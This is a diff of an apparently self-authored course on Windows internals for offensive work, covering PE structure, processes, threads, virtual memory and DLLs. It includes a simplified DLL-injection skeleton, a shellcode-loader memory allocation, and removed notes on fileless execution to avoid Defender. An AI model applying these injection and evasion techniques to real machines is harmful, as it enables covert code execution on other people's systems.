+Becomes (simplified):
+```asm
+mov DWORD PTR [rbp-4], 5    ; x = 5 (store at stack location)
+mov DWORD PTR [rbp-8], 3    ; y = 3 (store at stack location)
+mov eax, DWORD PTR [rbp-4]  ; Load x into EAX
+add eax, DWORD PTR [rbp-8]  ; Add y to EAX
+mov DWORD PTR [rbp-12], eax ; Store result as sum
+```
+
+## Example: What printf("Hello") Looks Like
+
+```asm
+lea rcx, hello_string      ; Load address of "Hello" into RCX (1st param)
+call printf                ; Call printf function
+```
+
+## Seeing It Yourself
+
+Compile with debug info and disassemble:
+
+**In Visual Studio Developer Command Prompt:**
+```
+cl /Zi test.c
+dumpbin /disasm test.exe > disasm.txt
+```
+
+Open `disasm.txt` and search for `main`. You will see the actual assembly!
+
+## Key Assembly Patterns to Recognize
+
+**Function start (prologue):**
+```asm
+push rbp          ; Save old base pointer
+mov rbp, rsp      ; Set up new base pointer
+sub rsp, 32       ; Make space for local variables
+```
+
+**Function end (epilogue):**
+```asm
+add rsp, 32       ; Clean up local variables
+pop rbp           ; Restore old base pointer
+ret               ; Return to caller
+```
+
+**This is what buffer overflow attacks target!** They overwrite the saved return address.
+
+---
+
+# CHAPTER 19: The PE Executable Format
+
+## Introduction
+
+When you compile a program, you get an .exe file.
+
+But what is inside that file?
+
+The .exe file follows a specific format called **PE** (Portable Executable).
+
+## Let Us Look Inside!
 
 Open PowerShell and run:
 
 ```powershell
-# Start Notepad
-Start-Process notepad
-Start-Sleep -Seconds 2
-
-# Get Notepad's process info
-$proc = Get-Process notepad
-
-# See basic info
-$proc | Format-List Id, ProcessName, WorkingSet64, VirtualMemorySize64
+Format-Hex -Path "C:\Windows\notepad.exe" | Select-Object -First 50
 ```
 
-**Output:**
+You will see something like:
+```
+           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
+
+00000000   4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ..............
+00000010   B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ........@.......
+```
+
+The first two bytes are `4D 5A` which is "MZ" in ASCII.
+
+**Every Windows executable starts with "MZ"!**
+
+## PE File Structure
 
 ```
-Id                 : 8472
-ProcessName        : notepad
-WorkingSet64       : 16629760
-VirtualMemorySize64: 2199127543808
+┌─────────────────────────┐
+│     DOS Header          │ ← Starts with "MZ" (0x4D 0x5A)
+│     (64 bytes)          │
+├─────────────────────────┤
+│     DOS Stub            │ ← Old DOS program ("This program cannot...")
+│     (variable size)     │
+├─────────────────────────┤
+│     PE Signature        │ ← "PE\0\0" (0x50 0x45 0x00 0x00)
+├─────────────────────────┤
+│     File Header         │ ← Basic info (machine type, number of sections)
+│     (20 bytes)          │
+├─────────────────────────┤
+│     Optional Header     │ ← Entry point, image base, section alignment
+│     (varies)            │
+├─────────────────────────┤
+│     Section Headers     │ ← Info about each section
+│     (40 bytes each)     │
+├─────────────────────────┤
+│     Sections            │ ← Actual code and data:
+│     .text  (code)       │   - .text = program code
+│     .data  (data)       │   - .data = global variables
+│     .rdata (read-only)  │   - .rdata = constants, import info
+│     .rsrc  (resources)  │   - .rsrc = icons, strings
+└─────────────────────────┘
 ```
 
-**What this tells you:**
+## Important Parts for Us
 
-- `Id: 8472` - This is Notepad's PID (Process ID)
-- `WorkingSet64: 16629760` - Notepad is using ~16 MB of RAM right now
-- `VirtualMemorySize64` - Total virtual address space (huge because 64-bit)
+**1. Entry Point**
 
-Now kill it:
+This is the address where execution starts. When you double-click an .exe, Windows jumps to this address.
+
+**2. Image Base**
+
+The preferred address where the .exe wants to be loaded in memory.
+
+64-bit programs usually: 0x0000000140000000
+32-bit programs usually: 0x00400000
+
+**3. Sections**
+
+| Section | Contains | Permissions |
+|---------|----------|-------------|
+| .text | Program code | Read + Execute |
+| .data | Variables that can change | Read + Write |
+| .rdata | Constants | Read only |
+| .rsrc | Resources (icons, etc) | Read only |
+
+## Viewing PE Details with PowerShell
 
 ```powershell
-Stop-Process -Id 8472
+# Get detailed PE information
+$bytes = [System.IO.File]::ReadAllBytes("C:\Windows\notepad.exe")
+
+# DOS Header check
+if ($bytes[0] -eq 0x4D -and $bytes[1] -eq 0x5A) {
+    Write-Host "Valid DOS Header (MZ)" -ForegroundColor Green
+}
+
+# Find PE signature offset (at byte 0x3C in DOS header)
+$peOffset = [BitConverter]::ToInt32($bytes, 0x3C)
+Write-Host "PE Header at offset: 0x$($peOffset.ToString('X'))"
+
+# Check PE signature
+if ($bytes[$peOffset] -eq 0x50 -and $bytes[$peOffset+1] -eq 0x45) {
+    Write-Host "Valid PE Signature" -ForegroundColor Green
+}
 ```
 
-### The Critical Insight for Attackers
+## Why PE Format Matters for Hacking
 
-RAM doesn't know the difference between "code" and "data." Both are just bytes. What makes bytes become "executable code" is:
+1. **Entry Point** - You can change where execution starts
+2. **Sections** - You can add new sections with your code
+3. **Import Table** - Lists which DLLs and functions the program uses
+4. **Export Table** - Lists what functions the program provides
 
-1. The bytes are in a memory region marked as executable (`r-x`)
-2. The CPU's instruction pointer (RIP register) points there
-
-**If you can:**
-1. Write your bytes into RAM
-2. Mark that region as executable
-3. Make the CPU jump there
-
-**Then your code runs.** This is the foundation of shellcode injection.
+When you analyze malware, you look at the PE structure to understand:
+- What functions does it call?
+- Is there suspicious code hidden?
+- Has it been modified from the original?
 
 ---
 
-## 1.3: Disk vs Memory - Why In-Memory Attacks Work
+# CHAPTER 20: How Windows Loads a Program
 
-### The Difference
+## Introduction
 
-| Aspect | Disk (Storage) | RAM (Memory) |
-|--------|----------------|--------------|
-| Speed | Slow (milliseconds) | Fast (nanoseconds) |
-| Persistence | Survives power off | Cleared on power off |
-| Scanning | **Heavily scanned by AV** | Harder to scan continuously |
-| Forensics | Files remain as evidence | Gone when power is off |
+You double-click notepad.exe. What actually happens?
 
-### Why Disk Gets Scanned
+Let us trace the entire journey step by step.
 
-When you download a file:
+## Step 1: You Double-Click
 
-1. File lands on disk
-2. Windows Defender's file system filter sees the write
-3. Defender scans the file against signature database
-4. If it matches known malware → **BLOCKED**
+When you double-click, Windows Explorer calls `CreateProcess()` with the path to notepad.exe.
 
-This happens for every file: downloads, extractions, copies.
+## Step 2: Windows Reads the File
 
-### Why Memory is Different
+Windows opens notepad.exe and reads the PE headers:
+- Checks the MZ and PE signatures
+- Reads the entry point address
+- Reads what sections exist
+- Reads what DLLs are needed
 
-If code only exists in RAM and never touches disk:
+## Step 3: Memory is Allocated
 
-- There's no file for signature scanning
-- Fewer forensic artifacts
-- Code disappears on reboot
+Windows creates a new process and allocates virtual memory:
 
-This is called **in-memory execution** or **fileless malware**.
+```
+User Space (available to notepad.exe):
+┌─────────────────────────┐ 0x00007FFFFFFFFFFF
+│                         │
+│   Stack (grows down)    │
+│                         │
+├─────────────────────────┤
+│   (free space)          │
+├─────────────────────────┤
+│   Heap (grows up)       │
+├─────────────────────────┤
+│   DLLs loaded here      │
+│   kernel32.dll          │
+│   ntdll.dll             │
+│   user32.dll            │
+├─────────────────────────┤
+│   notepad.exe           │ ← Image loaded at base address
+│   .text                 │
+│   .data                 │
+│   .rdata                │
+├─────────────────────────┤ 0x0000000000000000
 
-### HANDS-ON: See Defender Scan a File
-
-On Windows, download any file and watch:
-
-```powershell
-# Watch Defender's service
-Get-Process MsMpEng | Format-List CPU
+Kernel Space (not accessible to notepad.exe):
+├─────────────────────────┤
+│   Windows Kernel        │ ← Cannot touch this!
+└─────────────────────────┘
 ```
 
-The `MsMpEng.exe` process is Defender's core engine. Its CPU usage spikes when scanning.
+## Step 4: The Image is Mapped
+
+Windows copies each section from the file into memory:
+
+- .text section → memory with Execute permission
+- .data section → memory with Read+Write permission
+- .rdata section → memory with Read permission
+
+## Step 5: DLLs are Loaded
+
+Notepad needs functions from DLLs (like MessageBox from user32.dll).
+
+Windows loads each required DLL:
+1. Find the DLL file
+2. Map it into the process memory
+3. Repeat for any DLLs that DLL needs
+
+## Step 6: Imports are Resolved
+
+The Import Table says: "I need MessageBoxW from user32.dll"
+
+Windows:
+1. Finds where user32.dll was loaded
+2. Finds MessageBoxW in user32.dll's Export Table
+3. Writes that address into notepad's Import Table
+
+Now when notepad calls MessageBoxW, it knows exactly where to jump.
+
+## Step 7: Entry Point is Called
+
+Windows finally calls the entry point.
+
+For a C program, this is NOT main()!
+
+The actual entry point does setup work, then calls your main().
+
+```
+Windows calls → _mainCRTStartup()
+                    ↓
+                Sets up C runtime
+                    ↓
+                Calls your main()
+                    ↓
+                Your code runs!
+```
+
+## Step 8: Program Runs
+
+The CPU starts executing instructions from the entry point.
+
+Your program is now running!
+
+## Watching It Happen
+
+You can use Process Monitor (procmon) from Sysinternals to watch this:
+
+1. Download Process Monitor from Microsoft Sysinternals
+2. Set filter: "Process Name is notepad.exe"
+3. Double-click notepad.exe
+4. Watch all the file reads, registry access, and DLL loads!
+
+## Why This Matters for Your Attack
+
+When you inject shellcode:
+
+1. You need **executable memory** - Windows normally does not let you execute data
+2. You need to **bypass protections** - ASLR randomizes where things load
+3. You need to **call APIs** - Your shellcode needs to find function addresses
+
+Understanding how Windows loads programs helps you understand:
+- Where to put your shellcode
+- How to find API addresses
+- What security is checking
 
 ---
 
-## 1.4: The Operating System's Role
+*End of Portion 5 - Chapters 17, 18, 19, 20*
 
-### What the OS Does
+*What you learned:*
+- *Compilation turns your C code into machine code through multiple steps*
+- *Assembly is human-readable machine code*
+- *PE format is how Windows executables are structured*
+- *Windows loads programs by mapping sections, loading DLLs, and resolving imports*
+- *The entry point is where execution begins*
 
-The **Operating System (OS)** is software that:
-
-1. **Manages hardware** - talks to CPU, RAM, disk, network
-2. **Runs programs** - loads code, schedules execution
-3. **Enforces security** - controls what programs can access
-4. **Provides services** - APIs for file access, networking, etc.
-
-Windows, Linux, and macOS are operating systems.
-
-### Why the OS Matters for Attacks
-
-Every action our malware takes goes through the OS:
-
-| Our Action | How it works under the hood |
-|------------|----------------------------|
-| Allocate memory | We call `VirtualAlloc()` → OS maps RAM for us |
-| Run shellcode | We create a thread → OS schedules it on CPU |
-| Talk to C2 | We open socket → OS handles network stack |
-| Read files | We call `ReadFile()` → OS accesses disk for us |
-
-**The OS is both a barrier and a tool:**
-- Barrier: It enforces security (permissions, isolation)
-- Tool: It provides the APIs we use to do things
-
-### System Architecture
-
-```
-+--------------------------------------------------+
-|                YOUR PROGRAM                       |
-|      (Chrome, Notepad, malware, anything)        |
-|                                                  |
-|             RUNS IN USER MODE (Ring 3)           |
-|              Restricted - can't access           |
-|              other programs or hardware          |
-+--------------------------------------------------+
-                        |
-                        | System Calls (APIs)
-                        v
-+--------------------------------------------------+
-|              WINDOWS KERNEL                       |
-|      (ntoskrnl.exe, drivers)                     |
-|                                                  |
-|             RUNS IN KERNEL MODE (Ring 0)         |
-|              Full access to everything           |
-+--------------------------------------------------+
-                        |
-                        | Direct Control
-                        v
-+--------------------------------------------------+
-|                 HARDWARE                          |
-|         CPU, RAM, Disk, Network Card             |
-+--------------------------------------------------+
-```
+*Next portion: Windows Internals (Processes, Threads, Virtual Memory, APIs, DLLs)*
 
 ---
 
-## 1.5: User Mode vs Kernel Mode
-
-### What Are These Modes?
-
-The CPU has built-in **privilege levels** called rings. Windows uses two:
-
-| Mode | Ring | Who runs here | What it can do |
-|------|------|---------------|----------------|
-| **User Mode** | Ring 3 | Applications (Chrome, Notepad, malware) | Restricted |
-| **Kernel Mode** | Ring 0 | Windows kernel, drivers | Unrestricted |
-
-### What User Mode CANNOT Do
-
-Programs running in User Mode (Ring 3) cannot:
-
-- Read or write another process's memory
-- Access hardware directly (disk, network card, GPU)
-- Execute privileged CPU instructions
-- Modify kernel memory
-
-If a User Mode program tries these things, the CPU raises an exception and Windows terminates it.
-
-### What Kernel Mode CAN Do
-
-Code running in Kernel Mode (Ring 0) can:
-
-- Read/write any memory address (any process, even kernel)
-- Execute any CPU instruction
-- Directly control hardware
-- Modify any OS structure
-
-**This is why security tools like Defender run in kernel mode** - they need to see everything.
-
-### Why Separation Matters
-
-If every program had kernel access:
-- One buggy program could crash the entire system
-- Malware could instantly steal everything
-- No process isolation would exist
-
-User Mode isolation means:
-- A crashed program only crashes itself
-- Programs can't read each other's memory
-- Security boundaries exist
-
-### System Calls: Crossing the Boundary
-
-When your User Mode program needs kernel services, it makes a **system call**.
-
-**Example: Reading a file**
-
-When you call `ReadFile()` in your program:
-
-```
-Your program calls ReadFile()
-        |
-        v
-kernel32.dll translates to NtReadFile
-        |
-        v
-ntdll.dll sets up parameters, executes SYSCALL instruction
-        |
-        v
-================== RING 3/0 BOUNDARY ==================
-        |
-        v
-Kernel receives the call, validates permissions
-        |
-        v
-Kernel reads data from disk
-        |
-        v
-Kernel copies data to your buffer
-        |
-        v
-================== RING 0/3 BOUNDARY ==================
-        |
-        v
-Control returns to your program with the data
-```
-
-### HANDS-ON: See the Privilege Difference
-
-On Windows PowerShell:
-
-```powershell
-# Start Notepad
-Start-Process notepad
-Start-Sleep -Seconds 2
-
-# Get Notepad's process object
-$proc = Get-Process notepad
-
-# You can see basic info (User Mode access)
-$proc.Id
-$proc.WorkingSet64
-
-# But you can't read its memory arbitrarily
-# That would require OpenProcess + ReadProcessMemory with special privileges
-```
-
-You can **see** that Notepad exists and basic stats, but you can't read its internal data. That memory isolation is enforced by the CPU's privilege rings.
+# PART 5: WINDOWS INTERNALS
 
 ---
 
-## 1.6: Processes and Process IDs
+# CHAPTER 21: What is a Process
 
-### What is a Process?
+## Introduction
 
-A **process** is a running instance of a program. When you double-click notepad.exe:
+When you run a program, Windows creates a **process**.
 
-1. Windows creates a new process
-2. Allocates memory for it
-3. Loads the code from disk
-4. Starts execution
+A process is an isolated environment where the program runs.
 
-### What a Process Contains
+## What a Process Actually Is
 
-| Component | What it is |
-|-----------|------------|
-| **PID** | Unique Process ID number |
-| **Memory space** | Its own isolated RAM (code, heap, stack) |
-| **Threads** | At least one thread that executes code |
-| **Token** | Security identity (who is running this?) |
-| **Handles** | References to files, registry keys, etc. |
+A process has:
+- **Memory space** - Its own private memory (other programs cannot see it)
+- **Handle table** - List of files, windows, and resources it has opened
+- **At least one thread** - The actual execution
+- **Security token** - What permissions it has
 
-### HANDS-ON: See Running Processes
+## See Processes Right Now
 
-**On Windows:**
+Open Task Manager (Ctrl+Shift+Esc) and go to "Details" tab.
 
-```powershell
-# See all processes with their PIDs
-Get-Process | Select-Object Id, ProcessName | Sort-Object Id | Select-Object -First 20
+Each row is a process. You can see:
+- PID (Process ID) - Unique number for this process
+- Name - The executable name
+- Status - Running, Suspended, etc.
+- Memory - How much RAM it uses
+
+## Hands-On: Creating a Process in C
+
+Let us write a program that creates another process (starts notepad):
+
+```c
+#include <windows.h>
+#include <stdio.h>
+
+int main() {
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+    
+    // Initialize structures
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+    
+    // Create a new process (start notepad)
+    BOOL success = CreateProcess(
+        NULL,                   // Application name (NULL = use command line)
+        "notepad.exe",         // Command line
+        NULL,                   // Process security attributes
+        NULL,                   // Thread security attributes
+        FALSE,                  // Don't inherit handles
+        0,                      // Creation flags (0 = normal)
+        NULL,                   // Use parent's environment
+        NULL,                   // Use parent's current directory
+        &si,                    // Startup info
+        &pi                     // Process information (output)
+    );
+    
+    if (success) {
+        printf("Notepad started!\n");
+        printf("Process ID (PID): %d\n", pi.dwProcessId);
+        printf("Thread ID (TID): %d\n", pi.dwThreadId);
+        
+        // Close handles (important to avoid resource leak)
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    } else {
+        printf("Failed to start notepad. Error: %d\n", GetLastError());
+    }
+    
+    return 0;
+}
+```
+
+Compile and run:
+```
+cl create_process.c
+create_process.exe
+```
+
+You will see notepad open, and your program prints the PID!
+
+## Important Process Structures
+
+**PROCESS_INFORMATION** gives us:
+- `hProcess` - Handle to the new process
+- `hThread` - Handle to its main thread
+- `dwProcessId` - The PID
+- `dwThreadId` - The main thread's ID
+
+## Why Processes Matter for Hacking
+
+1. **Process Injection** - We inject our code into another process
+2. **Process Hollowing** - We replace a process's code with our own
+3. **Process Memory** - We can read/write other processes' memory (with permission)
+
+The `hProcess` handle is your key to interacting with a process!
+
+## Hands-On: List All Processes
+
+```c
+#include <windows.h>
+#include <tlhelp32.h>
+#include <stdio.h>
+
+int main() {
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    
+    if (snapshot == INVALID_HANDLE_VALUE) {
+        printf("Failed to get process snapshot\n");
+        return 1;
+    }
+    
+    PROCESSENTRY32 pe;
+    pe.dwSize = sizeof(PROCESSENTRY32);
+    
+    printf("%-10s %-30s\n", "PID", "Process Name");
+    printf("==========================================\n");
+    
+    if (Process32First(snapshot, &pe)) {
+        do {
+            printf("%-10d %-30s\n", pe.th32ProcessID, pe.szExeFile);
+        } while (Process32Next(snapshot, &pe));
+    }
+    
+    CloseHandle(snapshot);
+    return 0;
+}
+```
+
+Run it and see all processes on your system!
+
+---
+
+# CHAPTER 22: What is a Thread
+
+## Introduction
+
+A process is like a house. A thread is a person living in that house doing work.
+
+One house can have many people (one process can have many threads).
+
+All threads in a process share the same memory, but each thread has its own:
+- Stack (local variables)
+- Registers (current state)
+- Instruction pointer (where it is executing)
+
+## Why Multiple Threads?
+
+Imagine a browser:
+- Thread 1: Handles button clicks
+- Thread 2: Downloads files
+- Thread 3: Plays video
+- Thread 4: Renders the page
+
+All running at the same time (or quickly switching between).
+
+## Hands-On: Create a Thread in C
+
+```c
+#include <windows.h>
+#include <stdio.h>
+
+// This function runs in the new thread
+DWORD WINAPI ThreadFunction(LPVOID lpParam) {
+    int threadNum = *(int*)lpParam;
+    
+    for (int i = 0; i < 5; i++) {
+        printf("Thread %d: Count %d\n", threadNum, i);
+        Sleep(500);  // Wait 500 milliseconds
+    }
+    
+    return 0;
+}
+
+int main() {
+    int thread1Num = 1;
+    int thread2Num = 2;
+    
+    printf("Main: Creating threads...\n");
+    
+    // Create first thread
+    HANDLE hThread1 = CreateThread(
+        NULL,           // Default security
+        0,              // Default stack size
+        ThreadFunction, // Function to run
+        &thread1Num,    // Parameter to pass
+        0,              // Run immediately
+        NULL            // Don't need thread ID
+    );
+    
+    // Create second thread
+    HANDLE hThread2 = CreateThread(
+        NULL,
+        0,
+        ThreadFunction,
+        &thread2Num,
+        0,
+        NULL
+    );
+    
+    printf("Main: Threads created! Waiting for them to finish...\n");
+    
+    // Wait for both threads to complete
+    WaitForSingleObject(hThread1, INFINITE);
+    WaitForSingleObject(hThread2, INFINITE);
+    
+    printf("Main: Both threads finished!\n");
+    
+    CloseHandle(hThread1);
+    CloseHandle(hThread2);
+    
+    return 0;
+}
 ```
 
 Output:
 ```
-  Id ProcessName
-  -- -----------
-   0 Idle
-   4 System
- 156 Registry
- 488 smss
- 596 csrss
- 676 wininit
- 684 csrss
- 768 winlogon
- ...
+Main: Creating threads...
+Main: Threads created! Waiting for them to finish...
+Thread 1: Count 0
+Thread 2: Count 0
+Thread 1: Count 1
+Thread 2: Count 1
+...
+Main: Both threads finished!
 ```
 
-Each line is a separate process with its own memory space.
+The threads run at the same time!
 
+## Why Threads Matter for Hacking
+
+**CreateRemoteThread** - This is the key function for process injection!
+
+It creates a thread in ANOTHER process:
+
+```c
+HANDLE hRemoteThread = CreateRemoteThread(
+    hProcess,           // Handle to target process
+    NULL,               // Default security
+    0,                  // Default stack size
+    startAddress,       // Where to start executing (your shellcode!)
+    parameter,          // Parameter
+    0,                  // Run immediately
+    NULL                // Don't need thread ID
+);
+```
+
+This makes the target process run YOUR code!
+
+---
+
+# CHAPTER 23: What is Virtual Memory
+
+## Introduction
+
+Every process thinks it has all the memory to itself.
+
+Process A thinks it owns addresses 0 to 0x7FFFFFFFFFFF.
+Process B ALSO thinks it owns addresses 0 to 0x7FFFFFFFFFFF.
+
+But they have different data at the same addresses. How?
+
+**Virtual memory.**
+
+## How Virtual Memory Works
+
+Each process has its own "address translation table" (page table).
+
+When Process A reads address 0x1000:
+- Windows translates 0x1000 → Physical address 0x50000
+- Process A gets data from physical location 0x50000
+
+When Process B reads address 0x1000:
+- Windows translates 0x1000 → Physical address 0x80000 (different!)
+- Process B gets different data
+
+Same virtual address, different physical memory!
+
+## Memory Permissions
+
+Each memory region has permissions:
+
+| Permission | Meaning |
+|------------|---------|
+| No Access | Cannot read/write/execute |
+| Read | Can read but not write |
+| Read/Write | Can read and write |
+| Execute | Can execute as code |
+| Read/Write/Execute | Can do everything (dangerous!) |
+
+## Hands-On: Allocate Memory with VirtualAlloc
+
+```c
+#include <windows.h>
+#include <stdio.h>
+
+int main() {
+    // Allocate 4096 bytes (one page) of memory
+    LPVOID buffer = VirtualAlloc(
+        NULL,                          // Let Windows choose address
+        4096,                          // Size in bytes
+        MEM_COMMIT | MEM_RESERVE,      // Allocate and commit the memory
+        PAGE_READWRITE                 // Permissions: read + write
+    );
+    
+    if (buffer == NULL) {
+        printf("VirtualAlloc failed. Error: %d\n", GetLastError());
+        return 1;
+    }
+    
+    printf("Memory allocated at: %p\n", buffer);
+    
+    // Write something to it
+    char* message = "Hello from allocated memory!";
+    memcpy(buffer, message, strlen(message) + 1);
+    
+    // Read it back
+    printf("Content: %s\n", (char*)buffer);
+    
+    // Free the memory
+    VirtualFree(buffer, 0, MEM_RELEASE);
+    printf("Memory freed.\n");
+    
+    return 0;
+}
+```
+
+Output:
+```
+Memory allocated at: 0x000001A234560000
+Content: Hello from allocated memory!
+Memory freed.
+```
+
+## VirtualAlloc Parameters
+
+| Parameter | Meaning |
+|-----------|---------|
+| `NULL` | Let Windows choose the address |
+| `4096` | Size in bytes (must be page-aligned, 4096 is one page) |
+| `MEM_COMMIT` | Actually allocate physical memory |
+| `MEM_RESERVE` | Reserve address space |
+| `PAGE_READWRITE` | Can read and write, but NOT execute |
+
+## The Critical Permission: PAGE_EXECUTE_READWRITE
+
+For shellcode, we need to EXECUTE the memory:
+
+```c
+LPVOID executableMemory = VirtualAlloc(
+    NULL,
+    shellcodeSize,
+    MEM_COMMIT | MEM_RESERVE,
+    PAGE_EXECUTE_READWRITE    // Can read, write, AND execute!
+);
+```
+
+**This is how shellcode loaders work:**
+1. Allocate memory with execute permission
+2. Copy shellcode into that memory
+3. Jump to that memory (execute it)
+
+## Hands-On: Query Memory Information
+
+```c
+#include <windows.h>
+#include <stdio.h>
+
+int main() {
+    MEMORY_BASIC_INFORMATION mbi;
+    LPVOID address = (LPVOID)0x7FFE0000;  // Common system address
+    
+    if (VirtualQuery(address, &mbi, sizeof(mbi))) {
+        printf("Address: %p\n", mbi.BaseAddress);
+        printf("Region Size: %llu bytes\n", mbi.RegionSize);
+        printf("State: ");
+        
+        switch (mbi.State) {
+            case MEM_COMMIT: printf("Committed\n"); break;
+            case MEM_FREE: printf("Free\n"); break;
+            case MEM_RESERVE: printf("Reserved\n"); break;
+        }
+        
+        printf("Protection: 0x%X\n", mbi.Protect);
+    }
+    
+    return 0;
+}
+```
+
+---
+
+# CHAPTER 24: What is Windows API
+
+## Introduction
+
+Windows API (Application Programming Interface) is a set of functions that Windows provides.
+
+When you want to:
+- Open a file → Call CreateFile()
+- Show a window → Call CreateWindowEx()
+- Allocate memory → Call VirtualAlloc()
+- Create a process → Call CreateProcess()
+
+You ask Windows to do it through these functions.
+
+## API Layers
+
+```
+Your Program
+     ↓
+kernel32.dll (High-level API)
+     ↓
+ntdll.dll (Low-level API, Nt* functions)
+     ↓
+SYSCALL instruction
+     ↓
+Windows Kernel (Does the actual work)
+```
+
+When you call CreateFile(), you are actually calling:
+1. kernel32.dll!CreateFile()
+2. Which calls ntdll.dll!NtCreateFile()
+3. Which makes a syscall to the kernel
+4. The kernel opens the file
+
+## Hands-On: Calling Windows API
+
+```c
+#include <windows.h>
+#include <stdio.h>
+
+int main() {
+    // Get current process ID
+    DWORD pid = GetCurrentProcessId();
+    printf("My Process ID: %d\n", pid);
+    
+    // Get computer name
+    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
+    DWORD size = sizeof(computerName);
+    
+    if (GetComputerNameA(computerName, &size)) {
+        printf("Computer Name: %s\n", computerName);
+    }
+    
+    // Get user name
+    char userName[256];
+    size = sizeof(userName);
+    
+    if (GetUserNameA(userName, &size)) {
+        printf("User Name: %s\n", userName);
+    }
+    
+    // Get current directory
+    char currentDir[MAX_PATH];
+    GetCurrentDirectoryA(MAX_PATH, currentDir);
+    printf("Current Directory: %s\n", currentDir);
+    
+    // Get Windows version
+    OSVERSIONINFO osvi;
+    osvi.dwOSVersionInfoSize = sizeof(osvi);
+    
+    // This is deprecated but shows the concept
+    // GetVersionExA(&osvi);
+    
+    return 0;
+}
+```
+
+## Important APIs for Offensive Work
+
+**Memory:**
+- `VirtualAlloc()` - Allocate memory
+- `VirtualProtect()` - Change memory permissions
+- `VirtualAllocEx()` - Allocate in another process
+- `WriteProcessMemory()` - Write to another process
+
+**Process/Thread:**
+- `CreateProcess()` - Start a new process
+- `OpenProcess()` - Get handle to existing process
+- `CreateThread()` - Create thread in current process
+- `CreateRemoteThread()` - Create thread in another process
+
+**Module:**
+- `GetModuleHandle()` - Get address where DLL is loaded
+- `GetProcAddress()` - Get address of a function
+- `LoadLibrary()` - Load a DLL
+
+## Hands-On: Find Function Address
+
+```c
+#include <windows.h>
+#include <stdio.h>
+
+int main() {
+    // Get handle to kernel32.dll
+    HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
+    printf("kernel32.dll loaded at: %p\n", hKernel32);
+    
+    // Get address of VirtualAlloc function
+    LPVOID pVirtualAlloc = GetProcAddress(hKernel32, "VirtualAlloc");
+    printf("VirtualAlloc is at: %p\n", pVirtualAlloc);
+    
+    // Get address of CreateProcessA
+    LPVOID pCreateProcess = GetProcAddress(hKernel32, "CreateProcessA");
+    printf("CreateProcessA is at: %p\n", pCreateProcess);
+    
+    // We can also get ntdll functions
+    HMODULE hNtdll = GetModuleHandle("ntdll.dll");
+    printf("\nntdll.dll loaded at: %p\n", hNtdll);
+    
+    LPVOID pNtAllocateVirtualMemory = GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
+    printf("NtAllocateVirtualMemory is at: %p\n", pNtAllocateVirtualMemory);
+    
+    return 0;
+}
+```
+
+This is exactly how shellcode finds API addresses at runtime!
+
+---
+
+# CHAPTER 25: What is a DLL
+
+## Introduction
+
+DLL = Dynamic Link Library
+
+A DLL is a file containing code and data that multiple programs can use.
+
+Instead of every program having its own copy of "show a message box", they all share `user32.dll` which contains `MessageBox()`.
+
+## Why DLLs Exist
+
+1. **Saves memory** - One copy in RAM, many programs use it
+2. **Saves disk space** - Not duplicated in every .exe
+3. **Easy updates** - Update the DLL, all programs get the fix
+4. **Modular code** - Separate pieces, easier to manage
+
+## Important Windows DLLs
+
+| DLL | Contains |
+|-----|----------|
+| kernel32.dll | Core Windows functions (files, memory, processes) |
+| ntdll.dll | Low-level functions, syscall stubs |
+| user32.dll | User interface (windows, messages, input) |
+| gdi32.dll | Graphics (drawing, fonts, bitmaps) |
+| advapi32.dll | Security, registry, services |
+| ws2_32.dll | Network sockets |
+
+## Hands-On: See What DLLs a Process Uses
+
+In PowerShell:
 ```powershell
-# Count total processes
-(Get-Process).Count
+Get-Process notepad | Select-Object -ExpandProperty Modules | 
+    Select-Object ModuleName, FileName, BaseAddress | 
+    Format-Table -AutoSize
 ```
 
-You'll probably see 200-400 processes running.
+This shows all DLLs loaded by notepad!
 
-**On Linux:**
+## Hands-On: Load a DLL in C
+
+```c
+#include <windows.h>
+#include <stdio.h>
+
+int main() {
+    printf("Loading user32.dll...\n");
+    
+    // Load the DLL
+    HMODULE hUser32 = LoadLibrary("user32.dll");
+    
+    if (hUser32 == NULL) {
+        printf("Failed to load. Error: %d\n", GetLastError());
+        return 1;
+    }
+    
+    printf("user32.dll loaded at: %p\n", hUser32);
+    
+    // Get address of MessageBoxA
+    typedef int (WINAPI *MessageBoxA_t)(HWND, LPCSTR, LPCSTR, UINT);
+    
+    MessageBoxA_t pMessageBoxA = (MessageBoxA_t)GetProcAddress(hUser32, "MessageBoxA");
+    
+    if (pMessageBoxA) {
+        printf("MessageBoxA is at: %p\n", pMessageBoxA);
+        
+        // Call it!
+        pMessageBoxA(NULL, "Hello from loaded DLL!", "Test", MB_OK);
+    }
+    
+    // Unload the DLL
+    FreeLibrary(hUser32);
+    printf("DLL unloaded.\n");
+    
+    return 0;
+}
+```
+
+This loads user32.dll, finds MessageBoxA, and calls it!
+
+## DLL Injection
+
+This is a key attack technique:
+
+1. Load YOUR DLL into a target process
+2. Your DLL's code runs inside that process
+3. Now you have code execution in their process
+
+```c
+// Simplified concept (actual code is more complex)
+HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
+
+// Allocate memory in target for DLL path
+LPVOID remotePath = VirtualAllocEx(hProcess, NULL, pathLen, ...);
+
+// Write DLL path to target
+WriteProcessMemory(hProcess, remotePath, dllPath, pathLen, NULL);
+
+// Create thread in target that calls LoadLibrary with our path
+CreateRemoteThread(hProcess, NULL, 0, LoadLibraryA, remotePath, 0, NULL);
+
+// Now our DLL is loaded in the target process!
+```
+
+## Export and Import Tables
+
+**Export Table:** Lists functions the DLL provides to others.
+- `kernel32.dll` exports `CreateFile`, `VirtualAlloc`, etc.
+
+**Import Table:** Lists functions the program needs from DLLs.
+- `notepad.exe` imports `MessageBox` from `user32.dll`
+
+When Windows loads a program, it reads the import table and fills in the addresses from each DLL's export table.
+
+---
+
+*End of Portion 6 - Chapters 21, 22, 23, 24, 25*
+
+*What you learned:*
+- *Process is an isolated environment for a program*
+- *Thread is the actual execution path (one process can have many)*
